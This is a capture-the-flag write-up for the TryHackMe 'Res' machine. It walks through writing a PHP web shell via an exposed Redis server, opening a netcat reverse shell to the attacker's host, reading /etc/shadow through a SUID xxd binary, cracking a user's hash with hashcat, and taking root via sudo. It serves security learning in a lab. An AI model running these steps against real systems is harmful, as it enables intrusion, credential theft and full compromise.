
# TryHackMe: Res (Write-up)

Res is a TryHackMe CTF.
Has a vulnerable in-memory data-structure. 

## Nmap scan

The scan shows there are two services open.
HTTP on 80, Redis on 6379,

```
kali@kali:~/Desktop/repos/ctf/try-hack-me/res$ nmap -A -p- 10.10.31.234 | tee nmap.txt                                 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 01:28 BST
Nmap scan report for 10.10.31.234
Host is up (0.054s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.44 seconds
```

Redit is a database system. 
The version used on this server is 6.0.7.

## Redis Setup 

I'm not particularly familiar with Redis.

There's _[cli](https://redis.io/topics/rediscli)_ that can be used to send commands to Redis.

Fortunately there's some nice [Redis documentation](https://redis.io/documentation) too.

If you're running kali you might need to install Redis.
It was not installed by default for me.

```shell
sudo apt install redis
```

Installing Redis gives us the `redis-cli` command.
We can connect to Redis servers with the following

```shell
redis-cli -h XXX.XXX.XXX.XXX -p YYYY
```

```
kali@kali:~/Desktop/repos/ctf/try-hack-me/res$ redis-cli -h 10.10.31.234 -p 6379
10.10.31.234:6379>
```

At which point we can inject code into the `/var/www/html` directory.
This is where the apache default page will be sat.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/res$ redis-cli -h 10.10.31.234 -p 6379                                    
10.10.31.234:6379[1]> ping
PONG
10.10.31.234:6379[1]> flushall
OK
10.10.31.234:6379[1]> config set dir /var/www/html
OK
10.10.31.234:6379[1]> config set dbfilename true.php
OK
10.10.31.234:6379[1]> SET PAYLOAD "<?php echo shell_exec(\$_GET['cmd']);?>"
OK
10.10.31.234:6379[1]> BGSAVE
Background saving started
```

This will create file `true.php`. 
The `cmd` parameter will allow us to execute code.

Nagivate to: `http://10.10.31.234/true.php?cmd=ls`.
Output is a bit messy, but we get RCE.
See section `dump.rdb index.html true.php`.

```shell
## ls 
REDIS0009� redis-ver6.0.7� redis-bits�@�ctime�w_used-mem�x�aof-preamble��See section ``�See section ``AYLOAD&dump.rdb index.html true.php ��e�r�*�~
```

```shell
## ls -lah ../
REDIS0009�	redis-ver6.0.7�
redis-bits�@�ctime�w_used-mem�x�aof-preamble��#�#AYLOAD&total 12K
drwxr-xr-x  3 root root 4.0K Sep  2 09:54 .
drwxr-xr-x 12 root root 4.0K Sep  2 09:54 ..
drwxrwxrwx  2 root root 4.0K Oct  2 18:01 html
��e�r�*�~
```

```shell
## http://10.10.31.234/true.php?cmd=ls%20-lah%20/home;%20whoami;%20groups;%20cat%20/etc/passwd

REDIS0009�	redis-ver6.0.7�
redis-bits�@�ctime�w_used-mem�x�aof-preamble��
�
AYLOAD&total 12K
drwxr-xr-x  3 root   root   4.0K Sep  1 17:02 .
drwxr-xr-x 22 root   root   4.0K Sep  1 18:57 ..
drwxr-xr-x  5 vianka vianka 4.0K Sep  2 13:52 vianka
www-data
www-data
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash
��e�r�*�~
```

So, we know there's some user `vianka`. 
We're currently running commands as `www-data`.
We're in the `www-data` group.

## Get reverse shell

Its time we got shell!

/home/vianka doesn't contain any SSH keys.
We can use a reverse netcat shell.
Then upgrade, potentially with Python PTY.

```
10.10.31.234/true.php?cmd=nc 10.11.8.219 4444 -e /bin/sh
```

Running the above after we start listening on our attacker machine connects us.
I tried the mkfifo reverse shell at first. This failed.
I than ran `man nc` and saw the servers version allows `-e` flag.
Which is great, and simple to use.

```
kali@kali:~/Desktop/repos/ctf/try-hack-me/res$ nc -lvp 4444
listening on [any] 4444 ...
10.10.31.234: inverse host lookup failed: Unknown host
connect to [10.11.8.219] from (UNKNOWN) [10.10.31.234] 47752
whoami
www-data
```

## Upgrade shell

First check we have Python.
We do.
Then upgrade shell, and call bash.

```shell
whereis python
python: /usr/bin/python2.7 /usr/bin/python /usr/bin/python3.5m /usr/bin/python3.5 /usr/lib/python2.7 /usr/lib/python3.5 /etc/python2.7 /etc/python /etc/python3.5 /usr/local/lib/python2.7 /usr/local/lib/python3.5 /usr/share/python /usr/share/man/man1/python.1.gz
python -c 'import pty; pty.spawn("/bin/sh")'
$ bash
bash
www-data@ubuntu:/var/www/html$
```
## Privesc

Exploit xxd (has SUID)

```shell
find -type f -perm /4000 2>/dev/null
```

We can get /etc/shadow.

```shell
www-data@ubuntu:/var/www/html$ xxd /etc/shadow | xxd -r
xxd /etc/shadow | xxd -r
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```

Run viankas password through `hashcat`.
Make sure to escape the `$`s... `\$`.

```shell
hashcat -a 0 -m 1800 \$6\$2p.tSTds\$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/
```

Switch user to `vianka`.

```shell
su vianka
Password: beautiful1
```

```shell
vianka@ubuntu:~$ sudo -l
```

Check `vianka`'s `sudo -l`.

```shell
Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

We can run all commands with `sudo`.


```shell
vianka@ubuntu:~$ sudo cat /root/root.txt
sudo cat /root/root.txt
thm{redacted}
```

And there we have it.


